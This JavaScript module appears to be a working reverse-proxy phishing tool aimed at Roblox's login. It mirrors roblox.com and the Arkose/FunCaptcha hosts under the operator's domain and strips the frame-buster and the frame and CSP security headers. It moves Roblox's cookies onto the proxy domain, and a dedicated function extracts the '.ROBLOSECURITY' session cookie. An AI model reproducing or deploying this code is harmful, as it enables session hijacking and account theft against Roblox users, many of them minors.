const ALLOWED_HOSTS = new Set([
  "roblox.com",
  "www.roblox.com",
  "apis.roblox.com",
  "auth.roblox.com",
  "metrics.roblox.com",
  "ecsv2.roblox.com",
  "locale.roblox.com",
  "js.rbxcdn.com",
  "css.rbxcdn.com",
  "images.rbxcdn.com",
  "setup.rbxcdn.com",
  "api.arkoselabs.com",
  "cdn.arkoselabs.com",
  "client-api.arkoselabs.com",
  "roblox-api.arkoselabs.com",
  "assets.arkoselabs.com",
  "api.funcaptcha.com",
  "cdn.funcaptcha.com",
  "client-api.funcaptcha.com",
]);

const HOP_HEADERS = new Set([
  "connection",
  "content-length",
  "content-encoding",
  "transfer-encoding",
  "keep-alive",
  "upgrade",
  "x-frame-options",
  "content-security-policy",
  "cross-origin-opener-policy",
  "cross-origin-embedder-policy",
  "cross-origin-resource-policy",
]);

function allowedHost(host) {
  return ALLOWED_HOSTS.has(host) || host === "roblox.com" || host.endsWith(".roblox.com") || host.endsWith(".arkoselabs.com") || host.endsWith(".funcaptcha.com");
}

function proxied(url) {
  return `/roblox-proxy/${url.hostname}${url.pathname}${url.search}`;
}

function rewriteText(text, origin) {
  let out = String(text);
  // EnvironmentUrls.js builds hosts as "https://metrics.".concat(l). Preserve
  // the concatenation but put the resulting host behind our proxy.
  out = out.replace(/"https:\/\/([a-z0-9-]+)\."\.concat\(l\)/gi, (_m, prefix) => {
    return `"${origin}/roblox-proxy/${prefix}.".concat(l)`;
  });
  // Absolute Roblox/captcha URLs, including the protocol-relative form.
  out = out.replace(/https?:\/\/([a-z0-9.-]+)(\/[^\s"'<>]*)?/gi, (match, host, tail) => {
    if (!allowedHost(host.toLowerCase())) return match;
    return `/roblox-proxy/${host}${tail || "/"}`;
  });
  out = out.replace(/https?:\\\/\\\/([a-z0-9.-]+)((?:\\\/[^\s"'<>]*)?)/gi, (match, host, tail) => {
    if (!allowedHost(host.toLowerCase())) return match;
    return `/roblox-proxy/${host}${tail || "/"}`;
  });
  out = out.replace(/\/\/([a-z0-9.-]+)(\/[^\s"'<>]*)?/gi, (match, host, tail) => {
    if (!allowedHost(host.toLowerCase())) return match;
    return `/roblox-proxy/${host}${tail || "/"}`;
  });
  // The login bundles also build URLs as "https://" + apiSite. A relative
  // rewrite would be invalid there, so preserve a complete URL with our origin.
  out = out.replace(/"apiSite"\s*:\s*"([a-z0-9.-]+)"/gi, (_m, host) => {
    return allowedHost(host.toLowerCase()) ? `"apiSite":"${origin}/roblox-proxy/${host}"` : _m;
  });
  out = out.replace(/&quot;apiSite&quot;:&quot;([a-z0-9.-]+)&quot;/gi, (_m, host) => {
    return allowedHost(host.toLowerCase()) ? `&quot;apiSite&quot;:&quot;${origin}/roblox-proxy/${host}&quot;` : _m;
  });
  // Root-relative links and form actions stay on www.roblox.com.
  out = out.replace(/(href|src|action)=("|')\/(?!roblox-proxy\/)/gi, (_m, attr, quote) => {
    return `${attr}=${quote}/roblox-proxy/www.roblox.com/`;
  });
  // The official page has an inline frame-buster:
  // if (top.location != self.location) { top.location = self.location.href; }
  // It turns the iframe into chrome-error:// before the user can log in.
  out = out.replace(/if\s*\(top\.location\s*!=\s*self\.location\)\s*\{\s*top\.location\s*=\s*self\.location\.href;?\s*\}/g, "");
  out = out.replace(/<meta[^>]+requiresActiveX[^>]*>/gi, "");
  // A base also covers relative fetch/XHR calls made by the login bundle.
  return out.replace(/<head([^>]*)>/i, `<head$1><base href="/roblox-proxy/www.roblox.com/">`);
}

function forwardCookies(response, res, secure) {
  const cookies = response.headers.getSetCookie ? response.headers.getSetCookie() : [];
  if (!cookies.length) return;
  res.setHeader(
    "set-cookie",
    cookies.map((cookie) => {
      let out = cookie
        .replace(/;\s*domain=[^;]*/gi, "")
        .replace(/;\s*path=[^;]*/gi, "")
        .replace(/;\s*samesite=[^;]*/gi, "");
      out += "; Path=/; HttpOnly; SameSite=Lax";
      if (secure) out += "; Secure";
      return out;
    })
  );
}

export function robloxCookieFromRequest(req) {
  const cookies = String(req.headers.cookie || "").split(";");
  for (const part of cookies) {
    const [name, ...rest] = part.trim().split("=");
    if (name === ".ROBLOSECURITY" && rest.length) return rest.join("=");
  }
  return null;
}

async function requestBody(req) {
  if (req.method === "GET" || req.method === "HEAD") return undefined;
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  return Buffer.concat(chunks);
}

export async function proxyRoblox(req, res, target, fetchImpl = fetch) {
  let response;
  let requestPayload;
  try {
    requestPayload = await requestBody(req);
    response = await fetchImpl(target, {
    method: req.method,
    headers: {
      accept: req.headers.accept || "*/*",
      "accept-language": req.headers["accept-language"] || "pt-BR,pt;q=0.9,en;q=0.8",
      "content-type": req.headers["content-type"] || "application/x-www-form-urlencoded",
      cookie: req.headers.cookie || "",
      origin: "https://www.roblox.com",
      referer: "https://www.roblox.com/login",
      "user-agent": req.headers["user-agent"] || "Mozilla/5.0",
      "x-requested-with": req.headers["x-requested-with"] || "XMLHttpRequest",
      "x-csrf-token": req.headers["x-csrf-token"] || "",
      "x-xsrf-token": req.headers["x-xsrf-token"] || "",
    },
    body: requestPayload,
    duplex: "half",
    redirect: "manual",
    });
  } catch (error) {
    error.statusCode = 502;
    throw error;
  }

  const type = response.headers.get("content-type") || "application/octet-stream";
  const isText = /text|javascript|json|xml|css|svg|html/i.test(type) || /\.(js|mjs|css|json|html?|svg|xml)(\?|$)/i.test(target.pathname);
  const origin = `${req.headers["x-forwarded-proto"] || "http"}://${req.headers.host}`;
  let body = isText ? Buffer.from(rewriteText(await response.text(), origin), "utf8") : Buffer.from(await response.arrayBuffer());
  const headers = { "cache-control": "no-store", "content-type": type, "content-length": body.length };
  for (const [key, value] of response.headers.entries()) {
    if (!HOP_HEADERS.has(key.toLowerCase()) && !/^(content-type|cache-control|set-cookie|location)$/i.test(key)) {
      headers[key] = value;
    }
  }
  const location = response.headers.get("location");
  if (location) {
    const next = new URL(location, target);
    if (allowedHost(next.hostname)) headers.location = proxied(next);
  }
  forwardCookies(response, res, req.headers["x-forwarded-proto"] === "https");
  res.writeHead(response.status, headers);
  if (req.method === "HEAD") return res.end();
  res.end(body);
}

export function proxyTarget(req) {
  const url = new URL(req.url, "http://localhost");
  if (url.pathname === "/roblox-proxy/login") return "https://www.roblox.com/login";
  const match = /^\/roblox-proxy\/([^/]+)(\/.*)?$/.exec(url.pathname);
  if (!match) return null;
  const host = match[1].toLowerCase();
  if (!allowedHost(host)) return null;
  return `https://${host}${match[2] || "/"}${url.search}`;
}
